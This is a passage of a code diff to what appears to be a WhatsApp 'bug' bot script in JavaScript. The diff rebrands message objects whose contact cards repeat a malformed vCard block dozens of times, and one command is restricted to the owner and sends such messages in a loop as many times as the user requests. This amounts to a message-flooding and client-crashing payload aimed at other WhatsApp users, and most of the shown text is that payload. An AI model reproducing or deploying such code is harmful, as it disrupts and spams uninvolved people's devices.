karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
+let kontolfariz = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 ${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓\nitem1.TEL:+6283149877456\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./pict.jpg') }, { upload: haikal.waUploadToServer })
 var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "locationMessage": {
 						"degreesLatitude": -6.936928157735237,
 						"degreesLongitude": 107.72270679473877,
-						"caption": `© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍 ${philips}`,
+						"caption": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 ${philips}`,
 						"jpegThumbnail": messa.imageMessage,
 }
 }), { userJid: m.chat, quoted: kontolfariz })
@@ -5359,13 +5289,13 @@ if (!mek.key.fromMe) return reply('Khusus Owner Ajg!')
 if (args.length == 0) return m.reply(`Jumlah?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-let kontolfariz = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍 ${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:CXZA 935\nitem1.TEL:+6285775422460\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
+let kontolfariz = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 ${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓\nitem1.TEL:+6283149877456\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do 